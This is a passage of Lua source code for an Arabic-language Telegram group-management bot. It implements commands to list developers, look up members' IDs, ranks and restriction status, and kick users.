local abs =  'abs:sudo3:'
local list = DevAbs:smembers(loolIQ..abs)
text = "❗️🎒 ⌯ مطورين ٱڵـبوت : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
if DevAbs:get(loolIQ.."SudoNumberGp" .. v) then
gps = tonumber(DevAbs:get(loolIQ.."SudoNumberGp" .. v))
else
gps = 0
end
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text .. k .. "⌯ [" .. username .. "] \n⌯ Groups : ( " .. gps .. " )\n"
else
text = text .. k .. "⌯ ( " .. v .. " ) \n⌯ Groups : ( " .. gps .. " )\n"
end end
if #list == 0 then
text = "❗️⚠️ ⌯ عذرٱ ڵم يتم رفع ٱي مطورين"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     Source loolIQ     --
if text ==("كشف")  and msg.reply_to_message_id_ ~= 0 then 
function id_by_reply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
t = 'هاذا البوت'
elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(loolIQ..'abs:sudo3:',result.sender_user_id_) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(loolIQ..'abs:monsh:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ ٱسٱسي'
elseif DevAbs:sismember(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ'
elseif DevAbs:sismember(loolIQ..'bot:owner:'..msg.chat_id_,result.sender_user_id_) then
t = 'مدير'
elseif DevAbs:sismember(loolIQ..'abs:admins'..msg.chat_id_,result.sender_user_id_) then
t = 'ٱدمن'
elseif DevAbs:sismember(loolIQ..'abs:vipall:',result.sender_user_id_) then
t = 'مميز عٱم'
elseif DevAbs:sismember(loolIQ..'abs:ownerall:',result.sender_user_id_) then
t = 'مدير عٱم'
elseif DevAbs:sismember(loolIQ..'abs:adminall:',result.sender_user_id_) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(loolIQ..'abs:vipmem'..msg.chat_id_,result.sender_user_id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n❗️🎗 ⌯ صوره ⌯» ◝ '..pho.total_count_..' ◟'
end
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n❗️🎗 ⌯ صوره ⌯» ◝ '..pho.total_count_..' ◟'
end
if DevAbs:sismember(loolIQ..'bot:gban:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(loolIQ..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(loolIQ..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'مطرود'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ٱدمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
if data.username_ == false then
text = '❗️〽️ ⌯ ٱسمه ⌯» ◝ '..CatchName(data.first_name_,20)..
' ◟\n❗️🔑 ⌯ ٱيـډيه ⌯» ◝ '..result.sender_user_id_..
' ◟\n'..photouser1..
'\n❗️🔅 ⌯ ٱڵقيود ⌯» ◝ '..Tkeed..
' ◟\n❗️⚜️ ⌯ ٱڵتوٱجد ⌯» ◝ '..tt..
' ◟\n❗️📣 ⌯  بٱڵكروب ⌯» ◝ '..Renk..
' ◟\n❗️📯 ⌯ رتبته بٱڵبوت ⌯» ◝ '..t..
' ◟\n❗️🛎 ⌯ نوع حسٱبه ⌯» ◝ '..noh..' ◟'
monsend(msg,msg.chat_id_,text,data.id_) 
else
text = '❗️〽️ ⌯ ٱسمه ⌯» ◝ '..CatchName(data.first_name_,20)..
' ◟\n❗️🚸 ⌯ معرفه ⌯» ◝ [@'..data.username_..']'..
' ◟\n❗️🔑 ⌯ ٱيـډيه ⌯» ◝ '..result.sender_user_id_..
' ◟'..photouser1..
'\n❗️🔅 ⌯ ٱڵقيود ⌯» ◝ '..Tkeed..
' ◟\n❗️⚜️ ⌯ ٱڵتوٱجد ⌯» ◝ '..tt..
' ◟\n❗️📣 ⌯ رتبته بٱڵكروب ⌯» ◝ '..Renk..
' ◟\n❗️📯 ⌯ رتبته بٱڵبوت ⌯» ◝ '..t..
' ◟\n❗️🛎 ⌯ نوع حسٱبه ⌯» ◝ '..noh..' ◟'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil) 
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') then 
local username = text:match('^كشف @(.*)') 
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '❗️🛎 ⌯ نوع ٱڵحسٱب ⌯» ◝ '..ch..' ◟\n❗️🔑 ⌯ ٱلٱيدي ⌯» ◝ '..res.id_..' ◟\n❗️🚸 ⌯ ٱڵمعرف ⌯» ◝ [@'..username..'] ◟\n❗️〽️ ⌯ ٱلٱسم ⌯» ◝ '..res.title_..' ◟'
Dev_Abs(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '❗️🛎 ⌯ نوع ٱڵحسٱب ⌯» ◝ '..gr..' ◟\n❗️🔑 ⌯ ٱلٱيدي ⌯» ◝ '..res.id_..' ◟\n❗️🚸 ⌯ ٱڵمعرف ⌯» ◝ [@'..username..'] ◟\n❗️〽️ ⌯ ٱلٱسم ⌯» ◝ '..res.title_..' ◟'
Dev_Abs(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(res.id_) == tonumber(bot_id) then
t = 'هاذا بوت'
elseif tonumber(res.id_) == tonumber(bot_owner) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(loolIQ..'abs:sudo3:',res.id_) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(loolIQ..'abs:monsh:'..msg.chat_id_,res.id_) then
t = 'منشئ ٱسٱسي'
elseif DevAbs:sismember(loolIQ..'abs:monshid:'..msg.chat_id_,res.id_) then
t = 'منشئ'
elseif DevAbs:sismember(loolIQ..'bot:owner:'..msg.chat_id_,res.id_) then
t = 'مدير'
elseif DevAbs:sismember(loolIQ..'abs:admins'..msg.chat_id_,res.id_) then
t = 'ٱدمن'
elseif DevAbs:sismember(loolIQ..'abs:vipall:',res.id_) then
t = 'مميز عٱم'
elseif DevAbs:sismember(loolIQ..'abs:adminall:',res.id_) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(loolIQ..'abs:ownerall:',res.id_) then
t = 'مدير عٱم'
elseif DevAbs:sismember(loolIQ..'abs:vipmem'..msg.chat_id_,res.id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = res.id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = res.id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n❗️🎗 ⌯ صوره ⌯» ◝ '..pho.total_count_..' ◟'
end
if DevAbs:sismember(loolIQ..'bot:gban:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(loolIQ..'bot:banned:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(loolIQ..'tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
text = '❗️〽️ ⌯ ٱسمه ⌯» ◝ '..CatchName(data.first_name_,20)..
' ◟\n❗️🚸 ⌯ معرفه ⌯» ◝ [@'..data.username_..']'..
' ◟\n❗️🔑 ⌯ ٱيـډيه ⌯» ◝ '..res.id_..
' ◟'..photouser1..
'\n❗️🔅 ⌯ ٱڵقيود ⌯» ◝ '..Tkeed..
' ◟\n❗️⚜️ ⌯ ٱڵتوٱجد ⌯» ◝ '..tt..
' ◟\n❗️📣 ⌯ رتبته بٱڵكروب ⌯» ◝ '..Renk..
' ◟\n❗️📯 ⌯ رتبته بٱڵبوت ⌯» ◝ '..t..
' ◟\n❗️🛎 ⌯ نوع حسٱبه ⌯» ◝ '..noh..' ◟'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end,nil)
end,nil)
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') then 
local iduser = text:match('كشف (%d+)')  
if tonumber(iduser) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(iduser) == tonumber(bot_id) then
t = 'هاذا البوت'
elseif tonumber(iduser) == tonumber(bot_owner) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(loolIQ..'abs:sudo3:',iduser) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(loolIQ..'abs:monsh:'..msg.chat_id_,iduser) then
t = 'منشئ ٱساسي'
elseif DevAbs:sismember(loolIQ..'abs:monshid:'..msg.chat_id_,iduser) then
t = 'منشئ'
elseif DevAbs:sismember(loolIQ..'bot:owner:'..msg.chat_id_,iduser) then
t = 'مدير'
elseif DevAbs:sismember(loolIQ..'abs:admins:'..msg.chat_id_,iduser) then
t = 'ٱدمن'
elseif DevAbs:sismember(loolIQ..'abs:vipall:',iduser) then
t = 'مميز عٱم'
elseif DevAbs:sismember(loolIQ..'abs:adminall:',iduser) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(loolIQ..'abs:ownerall:',iduser) then
t = 'مدير عٱم'
elseif DevAbs:sismember(loolIQ..'abs:vipmem'..msg.chat_id_,iduser) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ لٱٱستطيع ٱتمٱم ٱلٱمر', 1, 'md')
return false  end
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n❗️🎗 ⌯ صوره ⌯» ◝ '..pho.total_count_..' ◟'
end
if pho.total_count_ == 0 then 
photouser1 = ''
else
photouser1 = '\n❗️🎗 ⌯ صوره ⌯» ◝ '..pho.total_count_..' ◟'
end
if DevAbs:sismember(loolIQ..'bot:gban:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(loolIQ..'bot:banned:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(loolIQ..'tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
if data.username_ == false then
text = '❗️〽️ ⌯ ٱسمه ⌯» ◝ '..CatchName(data.first_name_,20)..
' ◟\n❗️🔑 ⌯ ٱيـډيه ⌯» ◝ '..iduser..
' ◟\n'..photouser1..
'\n❗️🔅 ⌯ ٱڵقيود ⌯» ◝ '..Tkeed..
' ◟\n❗️⚜️ ⌯ ٱڵتوٱجد ⌯» ◝ '..tt..
' ◟\n❗️📣 ⌯ رتبته بٱڵكروب ⌯» ◝ '..Renk..
' ◟\n❗️📯 ⌯ رتبته بٱڵبوت ⌯» ◝ '..t..
' ◟\n❗️🛎 ⌯ نوع حسٱبه ⌯» ◝ '..noh..' ◟'
monsend(msg,msg.chat_id_,text,iduser) 
else
text = '❗️〽️ ⌯ ٱسمه ⌯» ◝ '..CatchName(data.first_name_,20)..
' ◟\n❗️🚸 ⌯ معرفه ⌯» ◝ [@'..data.username_..']'..
' ◟\n❗️🔑 ⌯ ٱيـډيه ⌯» ◝ '..iduser..
' ◟'..photouser1..
'\n❗️🔅 ⌯ ٱڵقيود ⌯» ◝ '..Tkeed..
' ◟\n❗️⚜️ ⌯ ٱڵتوٱجد ⌯» ◝ '..tt..
' ◟\n❗️📣 ⌯ رتبته بٱڵكروب ⌯» ◝ '..Renk..
' ◟\n❗️📯 ⌯ رتبته بٱڵبوت ⌯» ◝ '..t..
' ◟\n❗️🛎 ⌯ نوع حسٱبه ⌯» ◝ '..noh..' ◟'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil)
end,nil)
return false 
end 
--     Source loolIQ     --
if text:match("^[Gg]etid$") or text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
function id_by_reply(extra, result, success)
if DevAbs:get('lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ user id ⌯» ◝ "..result.sender_user_id_.." ◟", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱيـۧدي ٱڵعضو ⌯» ◝ "..result.sender_user_id_.." ◟", 1, 'md')
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,id_by_reply)
end
--     Source loolIQ     --
if text:match("^رتبته @(.*)$") then
local ap = {string.match(text, "^(رتبته) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Sudo all'
elseif is_sudoid(result.id_) then
t = 'Sudo 2'
elseif is_sudo3(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_ownerall(result.id_) then
t = 'owner all'
elseif is_adminall(result.id_) then
t = 'modod all'
elseif is_vipall(result.id_) then
t = 'vip all'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'المطور الاساسي '
elseif is_sudoid(result.id_) then
t = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(result.id_) then
t = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧنشئ'
elseif is_ownerall(result.id_) then
t = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(result.id_) then
t = 'ٱلٱدمن ٱڵعٱم'
elseif is_vipall(result.id_) then
t = 'ٱڵمميز ٱڵعٱم'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي مرتب 😹💔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧدير'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'ٱلٱدمـۧن'
elseif result.id_ == bot_id then
t = 'هذٱ ٱنٱ ٱڵبۄت'
else
t = 'فقط عضو'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ user ⌯» ◝ @'..ap[2]..' ◟ \n❗️🔑 ⌯ rank ⌯» '..t
else
text = '❗️🚸 ⌯ مُعرِفه ⌯» ◝ @'..ap[2]..' ◟ \n❗️🔑 ⌯ رتـۧبتـۧه ⌯» '..t
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '📤 this channel or group \n🏆is not have rank '
else
text = '❗️🚸 ⌯ ٱڵقنٱة ٱو ٱڵكروب ڵيس ڵه رتبه ' 
end
end
end
if not result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️📛 ⌯ Username is not correct'
else
text = '❗️📛 ⌯ ٱڵمعرف غير صحيح'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ii]d @(.*)$") then
local ap = {string.match(text, "^([Ii]d) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Sudo all'
elseif is_sudoid(result.id_) then
t = 'Sudo 2'
elseif is_sudo3(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_ownerall(result.id_) then
t = 'owner all'
elseif is_adminall(result.id_) then
t = 'modod all'
elseif is_vipall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'المطور الاساسي '
elseif is_sudoid(result.id_) then
t = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(result.id_) then
t = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧنشئ'
elseif is_ownerall(result.id_) then
t = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(result.id_) then
t = 'ٱلٱدمن ٱڵعٱم'
elseif is_vipall(result.id_) then
t = 'ٱڵمميز ٱڵعٱم'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي مرتب 😹💔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧدير'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'ٱلٱدمـۧن'
elseif result.id_ == bot_id then
t = 'هذٱ ٱنٱ ٱڵبۄت'
else
t = 'فقط عضو'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ user : ( @'..ap[2]..' )\n❗️📮 ⌯ id : ( '..result.id_..' )\n❗️💎 ⌯ rank : '..t
else
text = '❗️🚸 ⌯ مُعرِفه : ( @'..ap[2]..' )\n❗️📮 ⌯ ٱيـۧديـۧه : ( '..result.id_..' )\n❗️💎 ⌯ رتـۧبتـۧه : '..t
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ Channel : ( @'..ap[2]..' )\n❗️📮 ⌯ id : ( '..result.id_..' )'
else
text = '❗️🚸 ⌯ ٱڵقنٱة : ( @'..ap[2]..' )\n❗️📮 ⌯ ٱيديهٱ : ( '..result.id_..' )'
end
end
end
if not result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️📛 ⌯ Username is not correct'
else
text = '❗️📛 ⌯ ٱڵمعرف غير صحيح'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
if text:match("^ايدي @(.*)$") then
local ap = {string.match(text, "^(ايدي) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Chief'
elseif is_sudoid(result.id_) then
t = 'Sudo'
elseif is_sudo3(result.id_) then
t = 'sudo3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_ownerall(result.id_) then
t = 'owner all'
elseif is_adminall(result.id_) then
t = 'modod all'
elseif is_vipall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'Group Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'المطور الاساسي '
elseif is_sudoid(result.id_) then
t = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(result.id_) then
t = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧنشئ'
elseif is_ownerall(result.id_) then
t = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(result.id_) then
t = 'ٱلٱدمن ٱڵعٱم'
elseif is_vipall(result.id_) then
t = 'ٱڵمميز ٱڵعٱم'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'ٱڵمطي'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧدير'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'ٱلٱدمـۧن'
elseif result.id_ == bot_id then
t = 'ٱڵبۄت'
else
t = 'ٱڵعضو'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ user : ( @'..ap[2]..' )\n❗️📮 ⌯ id : ( '..result.id_..' )\n❗️💎 ⌯ rank : '..t
else
text = '❗️🚸 ⌯ '..t..' ⌯» ◝ @'..ap[2]..' ◟ \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟ '
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ Channel : ( @'..ap[2]..' )\n❗️📮 ⌯ id : ( '..result.id_..' )'
else
text = '❗️🚸 ⌯ ٱڵقنٱة ⌯» ◝ @'..ap[2]..' ◟ \n❗️🔑 ⌯ ٱيديهٱ ⌯» ◝ '..result.id_..' ◟ '
end
end
end
if not result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️📛 ⌯ Username is not correct'
else
text = '❗️📛 ⌯ ٱڵمعرف غير صحيح'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('طرد','Kick')
if text:match("^[Kk]ick$") and msg.reply_to_message_id_ ~= 0 then
function kick_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n❗️⚠️ ⌯ لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if not is_admin(result.sender_user_id_, result.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🎗 ⌯ The user : '..result.sender_user_id_..' \n️❗️🏌🏻‍♂️ ⌯ has been kicked \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n📮 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n🏌🏻‍♂️ ⌯ تـۖم طردة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--     Source loolIQ     --
if text:match("^[Kk]ick @(.*)$") then
local ap = {string.match(text, "^([Kk]ick) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n❗️⚠️ ⌯ لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not is_admin(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
texts = '*❗️🎗 ⌯ The User : '..result.id_..' \n❗️🏌🏻‍♂️ ⌯ has been kicked\n '
else
texts = '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n📮 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n🏌🏻‍♂️ ⌯ تـۖم طردة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n'
end
chat_kick(msg.chat_id_, result.id_)
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
texts = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],ban_by_username)
end
--     Source loolIQ     --
if text:match("^[Kk]ick (%d+)$") then
local ap = {string.match(text, "^([Kk]ick) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
